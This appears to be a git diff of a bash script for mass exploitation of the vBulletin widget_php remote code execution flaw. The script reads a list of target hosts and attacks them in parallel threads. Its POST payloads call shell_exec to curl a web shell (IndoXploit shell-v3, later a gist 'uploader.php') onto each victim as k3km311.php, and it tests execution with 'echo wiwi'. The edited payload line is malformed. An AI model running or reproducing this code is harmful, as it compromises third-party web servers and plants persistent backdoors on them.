@@ -22,12 +22,11 @@ function banner(){
 }
 function Kerak(){
 	en=$(echo $x | sed -f urlencode)
-	chekweb=$(curl --silent "http://tools.seobook.com/server-header-checker/?url=$en&useragent=8&protocol=11" |  grep -c "HTTP/1.1 200 OK")
+	chekweb=$(curl -kL --silent "http://tools.seobook.com/server-header-checker/?url=$en&useragent=8&protocol=11" |  grep -c "HTTP/1.1 200 OK")
 	}
 function bababa(){ 
-	Kerak;
 	if [[ $chekweb =~ "1" ]]; then
-        gassx=$(curl -kL --silent "${x}" --request POST --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('curl -s https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php' -o k3km311.php);" --output /dev/null -w "%{http_code}" )
+        gassx=$(curl -kL --silent "${x}" --request POST --data "https://gist.githubusercontent.com/widhisec/98a2d7e5c36d6ad88df14dd6ec08da05/raw/3a71897f3e6967dcc50ad98edff37664883d0e73/uploader.php' -o k3km311.php);" --output /dev/null -w "%{http_code}" )
             gase=$(curl -kL --silent "${x}" --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('echo wiwi');")
              grab=$(echo "$gase"| sed 's/\\r//g' | 
                 sed 's/\\t//g' | 
@@ -57,7 +56,7 @@ fi
 (
 for x in $(cat ${lst}); do
 	 ((thread=thread%LIMITATOR)); ((thread++==0)) && wait
-     bababa &
+     Kerak;bababa &
 done
 wait
 )
